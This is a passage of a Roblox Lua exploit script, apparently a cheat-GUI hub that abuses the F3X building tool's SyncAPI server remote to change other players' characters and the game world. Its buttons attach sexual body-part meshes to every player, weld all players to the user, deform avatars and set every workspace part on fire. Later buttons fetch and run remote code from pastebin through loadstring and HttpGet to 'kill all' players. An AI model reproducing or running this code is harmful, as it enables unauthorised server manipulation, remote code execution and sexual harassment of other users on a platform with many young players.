		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function Boob(player)

			char = player.Character

			for i,v in char:GetChildren() do

				pcall(function()

					SetLocked(v,false)

				end)

			end

			if player.Character:FindFirstChild("Boob2") then

				return

			else

				

			SetAnchor(true,player.Character.HumanoidRootPart)

			spawn(function()

				CreatePart(player.Character:WaitForChild("Right Leg").CFrame * CFrame.new(0,2,-0.6),player.Character)

				SetName(player.Character.Part,"Boob1")

				CreatePart(player.Character:WaitForChild("Left Leg").CFrame * CFrame.new(0,2,-0.6),player.Character)

				SetName(player.Character.Part,"Boob2")

			end)

			wait(0.2)

			repeat wait() until char:FindFirstChild("Boob2")

			spawn(function()

				AddMesh(char.Boob1)

				AddMesh(char.Boob2)

				SetMesh(char.Boob1,"5697933202")

				SetMesh(char.Boob2,"5697933202")

			end)

			wait(0.2)

			repeat wait() until char.Boob2:FindFirstChild("Mesh")

			MeshResize(char.Boob1,Vector3.new(0.4,0.4,0.4))

			MeshResize(char.Boob2,Vector3.new(0.4,0.4,0.4))

			pcall(function()

				Color(char.Boob1,char:WaitForChild("Torso").Color)

				Color(char.Boob2,char:WaitForChild("Torso").Color)

			end)

			wait(0.2)

			spawn(function()

				SetCollision(player.Character.Boob1,false)

				SetCollision(player.Character.Boob2,false)

				Weld(char.Boob1,char.HumanoidRootPart,char.Boob1)

				Weld(char.Boob2,char.Boob1,char.Boob2)

			end)

				repeat wait() until char.Boob2:FindFirstChild("BTWeld")

				for i,v in char:GetChildren() do

					pcall(function()

						SetLocked(v,false)

					end)

				end

				for i,v in char:GetChildren() do

					pcall(function()

						SetAnchor(false,v)

					end)

				end

			spawn(function()

				SetAnchor(false,char.HumanoidRootPart)

				SetAnchor(false,char.Boob1)

				SetAnchor(false,char.Boob2)

				end)

			end

		end

		for i,v in game.Players:GetPlayers() do

			--spawn(function()

			pcall(function()

				Boob(v)

			end)

			--end)

		end

	end)

end

coroutine.wrap(KEYDXW_fake_script)()

local function MXYYBZ_fake_script() -- SkyBox.LocalScript 

	local script = Instance.new('LocalScript', SkyBox)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function SpawnDecal(part,side)

			local args = {

				[1] = "CreateTextures",

				[2] = {

					[1] = {

						["Part"] = part,

						["Face"] = side,

						["TextureType"] = "Decal"

					}

				}

			}

	

			_(args)

		end

		function AddDecal(part,asset,side)

			local args = {

				[1] = "SyncTexture",

				[2] = {

					[1] = {

						["Part"] = part,

						["Face"] = side,

						["TextureType"] = "Decal",

						["Texture"] = "rbxassetid://".. asset

					}

				}

			}

			_(args)

		end

	

		function Sky(id)

			e = char.HumanoidRootPart.CFrame.x

			f = char.HumanoidRootPart.CFrame.y

			g = char.HumanoidRootPart.CFrame.z

			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)

			for i,v in game.Workspace:GetDescendants() do

				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then

					--spawn(function()

						SetName(v,"Sky")

						AddMesh(v)

					--end)

					--spawn(function()

						SetMesh(v,"8006679977")

						SetTexture(v,id)

					--end)

					MeshResize(v,Vector3.new(50,50,50))

					SetLocked(v,true)

				end

			end

		end

		Sky("13741328884")

	end)

end

coroutine.wrap(MXYYBZ_fake_script)()

local function GDBQE_fake_script() -- Peircer.LocalScript 

	local script = Instance.new('LocalScript', Peircer)



	script.Parent.MouseButton1Click:Connect(function()

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function Penis(player)

			char = player.Character

			for i,v in char:GetChildren() do

				pcall(function()

					SetLocked(v,false)

				end)

			end

			if player.Character:FindFirstChild("Penis") then

				return

			else

				

	

			SetAnchor(true,player.Character.HumanoidRootPart)

			spawn(function()

				CreatePart(player.Character:WaitForChild("Right Leg").CFrame * CFrame.new(-0.8,1,-0.6),player.Character)

				SetName(player.Character.Part,"Balls1")

				CreatePart(player.Character:WaitForChild("Left Leg").CFrame * CFrame.new(0.8,1,-0.6),player.Character)

				SetName(player.Character.Part,"Balls2")

			end)

			wait(0.2)

			repeat wait() until char:FindFirstChild("Balls2")

			print("done")

			spawn(function()

				CreatePart(player.Character:WaitForChild("Torso").CFrame * CFrame.new(0,-1,-1.3),player.Character)

				SetName(player.Character.Part,"Penis")

				CreatePart(player.Character:WaitForChild("Torso").CFrame * CFrame.new(0,-1,-2.5),player.Character)

				SetName(player.Character.Part,"Head1")

			end)

			repeat wait() until char:FindFirstChild("Head1")

			spawn(function()

				AddMesh(char.Balls1)

				AddMesh(char.Balls2)

				AddMesh(char.Head1)

				AddMesh(char.Penis)

			end)

			repeat wait() until char.Penis:FindFirstChild("Mesh")

			spawn(function()

				SetMesh(char.Penis,"4743972117")

				SetMesh(char.Head1,"4743972117")

				MeshResize(char.Penis,Vector3.new(0.5,0.5,3))

				MeshResize(char.Head1,Vector3.new(0.5,0.5,1))

			end)

			spawn(function()

				Weld(char.Penis,char.HumanoidRootPart,char.Penis)

				SetMesh(char.Balls1,"5697933202")

				SetMesh(char.Balls2,"5697933202")

				MeshResize(char.Balls1,Vector3.new(0.2,0.2,0.2))

				MeshResize(char.Balls2,Vector3.new(0.2,0.2,0.2))

			end)

			wait(0.2)

			pcall(function()

				Color(char.Balls1,char:WaitForChild("Torso").Color)

				Color(char.Balls2,char:WaitForChild("Torso").Color)

				Color(char.Penis,char:WaitForChild("Torso").Color)

				Color(char.Head1, Color3.fromRGB(255,100,100))

			end)

			wait(0.2)

			spawn(function()

				SetCollision(player.Character.Balls1,false)

				SetCollision(player.Character.Balls2,false)

				SetCollision(player.Character.Penis,false)

				SetCollision(player.Character.Head1,false)

			end)

			wait(0.2)

			spawn(function()

				Weld(char.Balls1,char.HumanoidRootPart,char.Balls1)

				Weld(char.Balls2,char.Balls1,char.Balls2)

				Weld(char.Head1,char.Penis,char.Head1)

			end)

			wait(0.2)

			spawn(function()

				SetAnchor(false,char.Balls1)

				SetAnchor(false,char.Balls2)

				SetAnchor(false,char.Penis)

				SetAnchor(false,char.Head1)

				SetAnchor(false,char.HumanoidRootPart)

				end)

				repeat wait()

					SetAnchor(false,char.HumanoidRootPart)

					SetAnchor(false,char.Balls1)

					SetAnchor(false,char.Balls2)

					SetAnchor(false,char.Penis)

					SetAnchor(false,char.Head1)

				until char.Head1.Anchored == false

			end

		end

		for i,v in game.Players:GetPlayers() do

			--spawn(function()

			--pcall(function()

				Penis(player)

			--end)

			--end)

		end

	end)

end

coroutine.wrap(GDBQE_fake_script)()

local function UQCEBIW_fake_script() -- StickAll.LocalScript 

	local script = Instance.new('LocalScript', StickAll)



	script.Parent.MouseButton1Click:Connect(function()

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function Stickify()

			for i,v in game.Players:GetPlayers() do

				for i,x in v.Character:GetDescendants() do

					if x:IsA("BasePart") then

						SetLocked(x,false)

					end

				end

				Weld(v.Character.HumanoidRootPart,char.HumanoidRootPart,v.Character.HumanoidRootPart)

			end

		end

		Stickify()

	end)

end

coroutine.wrap(UQCEBIW_fake_script)()

local function PAVETL_fake_script() -- TwigAll.LocalScript 

	local script = Instance.new('LocalScript', TwigAll)



	script.Parent.MouseButton1Click:Connect(function()

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function Twig()

			for i,v in game.Players:GetPlayers() do

				for i,x in v.Character:GetDescendants() do

					if x:IsA("BasePart") then

					pcall(function()

					SetLocked(x,false)

					AddMesh(x)

					MeshResize(x,Vector3.new(1,2,0.1))

						end)

					end

				end

			end

		end

		Twig()

	end)

end

coroutine.wrap(PAVETL_fake_script)()

local function RWUMPC_fake_script() -- FireParts.LocalScript 

	local script = Instance.new('LocalScript', FireParts)



	script.Parent.MouseButton1Click:Connect(function()

	local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

	function FireParts()

		for i,v in game.Workspace:GetDescendants() do

			spawn(function()

					SetLocked(v,false)

					AddFire(v)

			end)

		end

	end

	FireParts()

	end)

end

coroutine.wrap(RWUMPC_fake_script)()

local function SETN_fake_script() -- Frame.Dragify 

	local script = Instance.new('LocalScript', Frame)



	local UIS = game:GetService("UserInputService")

	function dragify(Frame)

	    dragToggle = nil

	    local dragSpeed = 0.50

	    dragInput = nil

	    dragStart = nil

	    local dragPos = nil

	    function updateInput(input)

	        local Delta = input.Position - dragStart

	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)

	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()

	    end

	    Frame.InputBegan:Connect(function(input)

	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then

	            dragToggle = true

	            dragStart = input.Position

	            startPos = Frame.Position

	            input.Changed:Connect(function()

	                if input.UserInputState == Enum.UserInputState.End then

	                    dragToggle = false

	                end

	            end)

	        end

	    end)

	    Frame.InputChanged:Connect(function(input)

	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then

	            dragInput = input

	        end

	    end)

	    game:GetService("UserInputService").InputChanged:Connect(function(input)

	        if input == dragInput and dragToggle then

	            updateInput(input)

	        end

	    end)

	end

	

	dragify(script.Parent)

end

coroutine.wrap(SETN_fake_script)()

local function LRPIF_fake_script() -- ReplicationGui.LocalScript 

	local script = Instance.new('LocalScript', ReplicationGui)



	script.Parent.Parent = game.CoreGui

end

coroutine.wrap(LRPIF_fake_script)()

end)



MainSection5:NewButton("Vector13 (F3X)","", function()

local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()

local Window = Library.CreateLib("Vector13 (Beta)", "Sentinel")

local Tab = Window:NewTab("Destroy")

local Section1 = Tab:NewSection("Destroy")

Section1:NewButton("Kill All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

for _,player in pairs(game.Players:GetPlayers()) do

F3X.Object(player.Character.Head):Destroy()

end

end)

Section1:NewButton("Potato Troll", "", function()

 local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

             local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       

       part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Head"])

F3X.Object(player.Character["Head"]).Transparency = 1

local lol = part:AddMesh()

       lol.MeshId = "http://www.roblox.com/asset/?id=4946447704"

lol.TextureId = "http://www.roblox.com/asset/?id=4946447928"

lol.Scale = Vector3.new(4, 4, 4)

end)

end

end)

Section1:NewButton("Sonic Troll", "", function()

 local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

             local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       

       part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Head"])

F3X.Object(player.Character["Head"]).Transparency = 1

local lol = part:AddMesh()

       lol.MeshId = "http://www.roblox.com/asset/?id=430064078"

lol.TextureId = "http://www.roblox.com/asset/?id=430064079"

lol.Scale = Vector3.new(0.8, 0.8, 0.8)

end)

end

end)

Section1:NewButton("Toad All", "", function()

 local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

             local part = F3X.new("Part", workspace)

       part.Locked = true

